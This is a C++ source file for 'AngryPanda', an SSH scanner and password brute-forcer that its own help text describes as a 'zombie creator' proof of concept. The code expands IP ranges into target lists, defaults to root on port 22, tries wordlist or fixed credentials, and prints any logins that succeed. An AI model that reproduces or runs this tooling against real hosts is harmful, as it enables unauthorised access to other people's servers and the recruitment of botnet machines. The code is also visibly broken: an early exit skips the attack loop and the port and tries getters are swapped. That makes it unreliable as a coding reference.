#include "../include/panda.h"

panda::panda()
{
    logger = pandalogger::getLogger();
    // Set up all arguments with their default settings.
    arguments.port = 22;
    arguments.verbosity = false;
    arguments.tries = 1;
    arguments.username = new char[255];
    arguments.password = new char[255];
    arguments.wordlistPath = new char[255];
    //std::cout << "Checkpoint 1 \n";
    strcpy(arguments.username,"root");
    //std::cout << "Checkpoint 1.5 \n";
    strcpy(arguments.wordlistPath,"wordlist.txt");
    arguments.mode = true;

}


/*
** This function checks if everything is set up correctly,
** and sets default settings if it's not. The value returned is an array of integers used to retrieve messages.
** The value can be used to retrieve the message from pandalogger::getMsg()
**
** @return *integer
*/
int* panda::checkSetup()
{
    int* returnvalue= new int[255];
    int where = -1;
    if(arguments.mode)
    {
        if(arguments.wordlistPath == NULL)
        {
            strcpy(arguments.wordlistPath,"wordlist.txt");
            returnvalue[where++] = 1;
            returnvalue[where++] = 2;
        }
    }
    if(!arguments.mode)
    {
        returnvalue[where++] = 3;
        if(arguments.username == NULL)
        {
            returnvalue[where++] = 4;
            returnvalue[where++] = 5;
            strcpy(arguments.username,"root");
        }
        if(arguments.password == NULL)
        {
            returnvalue[where++] = 6;
            returnvalue[where++] = 7;
            arguments.mode = true;
        }
    }
    if(!arguments.port)
    {
        returnvalue[where++];
        arguments.port = 22;
    }

    return returnvalue;
}

/*
** This one returns the configuration, useful for displaying information before running an attack.
** Basically just grabs information from the getters and puts it together in a more stylish way for terminal or log output.
**
** @return std::string
*/
std::string panda::getConfiguration()
{
    std::string config;
    config = "\n\n+--------------[AngryPanda Configuration]---------------\n|\n|\tHosts: \t\t" + stringify(getHosts());
    config += "\n|\tTarget count:\t\t" + stringify(getHostCount());
    config += "\n|\tPort:\t\t" + stringify(getPort());
    config += "\n|\tMode:\t\t" + stringify(getMode());
    config += "\n|\tTries/IP:\t" + stringify(getTries());

    if(arguments.mode)
    {
        config += "\n|\tWordlist:\t" + stringify(getWordlist());
        config += "\n|\tUsername:\t" + stringify(getUsername());
    }
    else
    {
        config += "\n|\tUsername:\t" + stringify(getUsername());
        config += "\n|\tPassword:\t" + stringify(getPassword());
    }
    return config;
}

int panda::attack()
{
    std::cout << "\nInitiating PandaPhase 1... \n\n";

    // Perform the actual connection attempts
    std::stringstream s;
    std::string argHost;
    pandaSessions connections;
    pandaSessions::iterator connectIterator;

    // First we need to filter out what hosts are actually usable - the ones we fail to connect to will be removed from the list
    if(!pandassh::filterAlive(&arguments))
    {
        logger->getMessage("FAILED_TO_FILTER_ALIVE");
        exit(0);
    }
    else
        printf("\nPanda has successfully filtered dead hosts.");
    exit(0);

    for (arguments.x = arguments.hosts.begin(); arguments.x != arguments.hosts.end(); arguments.x++)
    {
        if(!argHost.empty())
            argHost = "";
        printf("\n[AngryPanda]: Setting up connection variables for %s",*arguments.x);
        connections.insert(connections.end(),new pandassh(*arguments.x,arguments.port,arguments.mode,arguments.username,arguments.password));
        usleep(500);
    }

    for(connectIterator = connections.begin(); connectIterator != connections.end(); connectIterator++)
    {
        std::cout << "\nTrying to establish connection ....";
        int test = (*connectIterator)->establishConnection();
        std::cout << "\nTest was " << test << " which means ...";
        if(test>0)
        {
            printf("\n[HappyPanda]:\tSuccessfully connected to %s with username %s and password %s",(*connectIterator)->GetHost(),(*connectIterator)->GetUsername(),(*connectIterator)->GetPassword());
        }
        else if(arguments.verbosity)
        {
            if(arguments.verbosity)
                std::cout << "\n[SadPanda]:\t" << (*connectIterator)->GetLastMsg();
        }
        else
            std::cout << "\n[SadPanda]:\t" << (*connectIterator)->GetLastMsg();
        usleep(5000);
    }
}

// Setters

/*
** Takes the argument given by the user as either:
** xxx.xxx.xxx.xxx-yyy (IP range)
** or
** xxx.xxx.xxx.xxx (single IP)
** or
** Domain.com (domain name)
**
** @params char* hosts
**
*/
void panda::setHosts(char* hosts)
{
    this->usersHosts = hosts;
    std::stringstream stream;
    std::string tmpHost;
    stream << hosts;
    stream >> tmpHost;
//    targets = tmpHost;


    // Get amount of dots in URL to check for potential IP
    int dots = std::count(tmpHost.begin(), tmpHost.end(), '.');

    //If there's three dots, we assume it's an IP address.
    // Note: This can be a weakness, if a domain name has been entered with multiple subdomains distributed over different servers. Fix this!
    if(dots == 3)
    {
        // Split by dots and loop through. At least 4 sections need to be numeric.
        char* pointChar;
        int numericSections = 0;
        int sections[5];

        // Only accept numbers, 0-9, in between the dots and dashes.
        pointChar = strtok(hosts,".-");

        // Loop through every part of the string (between dots or dashes), and check if that specific part is numeric.
        while(pointChar != NULL)
        {
            int n = strspn(pointChar, "0123456789");

            if(n)
            {
                sections[numericSections] = atoi(pointChar);
                numericSections++;
            }
            pointChar = strtok(NULL,".-");
        }

        // Now that we've counted the amount of numeric sections, we can check how many there were and make a proper decision
        // on how to use the input.

        // If it's less than or exactly 4 sections, it's a single IP - just add it as the first element of the list.
        if(numericSections <= 4)
        {
            arguments.hosts.insert(arguments.hosts.end(),hosts);
        }
        else if(numericSections>4) // If there are more numeric sections than 4, this means its an IP range.
        {
            std::string hostIP;

            for(int k=sections[3];k <= sections[4];k++)
            {
                std::stringstream ss (std::stringstream::in | std::stringstream::out | std::stringstream::trunc);

                ss << sections[0] << "." << sections[1] << "." << sections[2] << "." << k;
                ss >> hostIP;
                char* cHost = new char[255];

                strcpy(cHost,itoa(sections[0]));
                strcat(cHost,".");
                strcat(cHost,itoa(sections[1]));
                strcat(cHost,".");
                strcat(cHost,itoa(sections[2]));
                strcat(cHost,".");
                strcat(cHost,itoa(k));
                if(arguments.verbosity)
                    std::cout << "\n[AngryPanda]:\tAdding " << cHost << " to hostlist.";
                arguments.hosts.insert(arguments.hosts.end(),cHost);
            }

        }
        else
        {
            if(arguments.verbosity)
                std::cout << "\n[AngryPanda]:\tAdding " << tmpHost << " as only host.";
            arguments.hosts.insert(arguments.hosts.end(),hosts);
        }
    }
    else
    {
        if(arguments.verbosity)
            std::cout << "\n[AngryPanda]:\tAdding " << tmpHost << " as only host.";
        arguments.hosts.insert(arguments.hosts.end(),hosts);
    }
}

/*
** Sets the mode boolean (true is wordlist mode, false is straight mode)
** using the user argument "straight" or "wordlist"
**
** @params char* mode
**
*/
void panda::setMode(char* mode)
{
    if(strstr(mode,"straight")!=0)
        arguments.mode = false;
    else if(strstr(mode,"wordlist")!=0)
        arguments.mode = true;
    else
    {
        if(arguments.verbosity)
            std::cout << "\n[SadPanda]:\t" << mode << " is not a recognized mode. Panda assumes wordlist mode.";
        arguments.mode = true;
    }
}

/*
** Sets the password as defined by the user. This is used for straight attacks, as in connecting to a server where the password is known.
** If wordlist mode is set, this password will be ignored.
**
** @params char* password
*/
void panda::setPassword(char* password)
{
    if(arguments.verbosity)
                std::cout << "\n[AngryPanda]:\tPassword will be set to " << password << ". If this is incorrect, Panda will hate on you.";
    arguments.password = password;
}

/*
** Sets the port specified by the user. If no port is specified, or the port specified is not numeric, default port (22) will be set.
**
** @params char* port
*/
void panda::setPort(char* port)
{
    if(!isdigit(*port))
    {
        if(arguments.verbosity)
            std::cout << "\n[SadPanda]:\t" << port << " is not an integer. Port must be an integer. :(" << "\n[AngryPanda]: Panda is not dumb! Panda assumes default port 22.";
        arguments.port = 22;
    }
    else
        arguments.port = atoi(port);
}

/*
** Sets the username specified by the user. If no username is specified, default (root) will be used.
**
** @params char* username
*/
void panda::setUsername(char* username)
{
    if(arguments.verbosity)
        std::cout << "\n[AngryPanda]:\tUsername will be set to " << username << ". If this is incorrect, Panda will hate on you.";
    arguments.username = username;
}

/*
** Sets the wordlist (including the path if not in the same directory) specified by the user. If no wordlistpath is specified, this will default to value set in ctor.
**
** @params char* wordlist
*/
void panda::setWordlist(char* wordlist)
{
    if(arguments.verbosity)
        std::cout << "\n[AngryPanda]:\tUsing wordlist " << wordlist << ". If this is incorrect, Panda will hate on you.";
    arguments.wordlistPath = wordlist;
}

/*
** Sets the amount of tries for each host. If set to 0, amount of lines in the wordlist will be used in wordlist mode, or default 20 will be used for straight mode.
**
** @params char* tries
*/
void panda::setTries(char* tries)
{
    if(!isdigit(*tries))
    {
        if(arguments.verbosity)
            std::cout << "\n[SadPanda]:\t" << tries << " is not an integer. Attempt-counter must be an integer. :(" << "\n[AngryPanda]: Panda is not dumb! Panda assumes default value of 20.";
        arguments.tries = 20;
    }
    else
    {
        arguments.tries = atoi(tries);
    }
}

/*
** Enables verbosity. If enabled, output and logging will occur during runtime. By default, verbosity is turned off.
*/
void panda::enableVerbosity()
{
    arguments.verbosity = true;
}

// Getters

/*
** Returns the username defined by the user (or default definition)
**
** @return char*
*/
char* panda::getUsername()
{
    return arguments.username;
}

/*
** Returns the password defined by the user (or set from the wordlist)
**
** @return char*
*/
char* panda::getPassword()
{
    return arguments.password;
}

/*
** Returns the list of hosts as entered by the user
**
** @return char*
*/
char* panda::getHosts()
{
    return usersHosts;
}

/*
** Returns the wordlist path
**
** @return char*
*/
char* panda::getWordlist()
{
    return arguments.wordlistPath;
}

/*
** Returns the amount of hosts in the hostlist
**
** @return int
*/
int panda::getHostCount()
{
    int count = (int)arguments.hosts.size();
    return count;
}

/*
** Returns the currently used mode as a char string
**
** @return char*
*/
char* panda::getMode()
{
    char* mode = "Straight";
    if(arguments.mode)
        mode = "Wordlist";
    return mode;
}

/*
** Returns the amount of connection attempts for each host.
**
** @return int
*/
int panda::getTries()
{
    return arguments.port;
}

/*
** Returns the port defined by the user (or default definition)
**
** @return int
*/
int panda::getPort()
{
    return arguments.tries;
}

/*
** Returns the current verbosity mode (on or off, true or false)
**
** @return boolean
*/
bool panda::getVerbosity()
{
    return arguments.verbosity;
}

/*
** Returns an integer as a char
**
** @return char
*/
char* panda::itoa(int val){
    int base = 10;
	static char buf[32] = {0};

	int i = 30;

	for(; val && i ; --i, val /= base)

		buf[i] = "0123456789abcdef"[val % base];

	return &buf[i+1];

}

/*
** Turn an integer into a string and return it.
**
** @param integer i
** @return string
*/

std::string panda::stringify(int i)
{
    std::stringstream ss;
    std::string value;
    ss << i;
    ss >> value;
    return value;
}

/*
** Turn a char* into a string and return it.
**
** @param char* c
** @return string
*/
std::string panda::stringify(char* c)
{
    std::stringstream ss;
    std::string value;
    ss << *c;
    ss >> value;
    return value;
}

/*
** Turn a char into a string and return it
**
** @param char c
** @return string
*/
std::string panda::stringify(char c)
{
    std::stringstream ss;
    std::string value;
    ss << c;
    ss >> value;
    return value;
}

/*
** Returns the help text
**
** @return string
*/
std::string panda::getHelp()
{
    std::string help;

    help = "\n\n\nWelcome to AngryPanda Insecurity. \n";
    help += "---------------------------------\n";
    help += "AngryPanda is an experimental SSH scanner / bruter / zombie creator \nwritten partly as a PoC, partly for learning purposes and released \nunder the WTFPL license.\n\nThe following options are available:\n";
    help += "-m \t Sets the mode - available options are: wordlist, straight\n";
    help += "-t \t Sets the target IP or hostname. This option is required.\n";
    help += "-p \t Sets the port (or range of ports) to try for any given IP or IP range.\n";
    help += "-c \t Sets the amount of tries before giving up for any given IP or IP in a range.\n";
    help += "\n-----------[Straight Mode]-----------\nThese options are required for straight mode: \n";
    help += "\n-u \t Username to login with \n";
    help += "-pw \t Password to use for authentication \n";


    help += "\n-----------[Wordlist Mode]-----------\nThese options are available for wordlist mode: \n";
    help += "\n-w \t Path to wordlist. If left undefined, \n\t AngryPanda will use the default wordlist. \n";
    help += "\n\nPanda knows.\n\n";
    return help;
}


/*
** Returns the banner as a string
**
** @return string
*/

std::string panda::getBanner()
{
    std::string banner;
    banner = "...MMMMMMM.................. MMMMMMMM...\n";
    banner += ".MMMMMMMMMMM...MMMMMMMMM...MMMMMMMMMMM..\n";
    banner += " MMM     MMMMMMMMMMMMMMMMMMMMM.    MMM  \n";
    banner += " MMM....MMMMMMMMMMMMMMMMMMMMMMM ...MMM .\n";
    banner += ".MMMM.MMMMMMMM ......... MMMMMMMM.MMMM..\n";
    banner += "..MMMMMMMM ................. MMMMMMMM ..\n";
    banner += ".. MMMMM.......................MMMMM....\n";
    banner += "..MMMMM.........................MMMMM ..\n";
    banner += ".MMMMM...........................MMMMM..\n";
    banner += "MMMMM ......................... ..MMMMM.\n";
    banner += "MMMM.....M................... M....MMMM.\n";
    banner += "MMMM....NMMM................MMM....MMMM \n";
    banner += "MMMM....MMMMMMM..........MMMMMMM...MMMMO\n";
    banner += "MMMM...MMMMMMMMMMM:..MMMMMMMMMMMM..MMMMI\n";
    banner += "MMMM...MMMMMM,MMMMI..MMMMMMMMMMMM..MMMM \n";
    banner += "MMMMM..MMMMM...MMM....MMM...MMMM .MMMMM.\n";
    banner += " MMMM ..MMMMMMMMM .... MMMMMMMM,..MMMM..\n";
    banner += ".MMMMM ... MMMM ...M.....MMMM ...MMMMM..\n";
    banner += "..MMMMMM..........MMM .........MMMMMM...\n";
    banner += "...MMMMMMZ................... MMMMMM....\n";
    banner += ".... MMMMMMM..............,MMMMMMM......\n";
    banner += ".....MMMMMMMMMMMM...  MMMMMMMMMMMM......\n";
    banner += ".....MM..MMMMMMMMMMMMMMMMMMMMM..MM......\n";
    banner += ".... MM...MMMMMMMMMMMMMMMMMMM...MM .....\n";
    banner += ".....MMMMMMMMMMMMMMMMMMMMMMMMMMMMM......\n";
    return banner;
}


panda::~panda()
{
    //dtor
}
